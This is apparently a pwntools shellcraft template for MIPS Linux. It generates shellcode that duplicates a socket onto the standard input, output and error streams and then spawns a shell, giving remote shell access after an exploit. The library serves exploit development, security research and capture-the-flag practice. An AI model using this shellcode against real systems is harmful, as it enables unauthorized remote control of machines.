<% from pwnlib.shellcraft.mips import linux %>
<%page args="sock = '$s0'"/>
<%docstring>
Args: [sock (imm/reg) = s0 ]
    Duplicates sock to stdin, stdout and stderr and spawns a shell.
</%docstring>


${linux.dupio(sock)}

${linux.sh()}
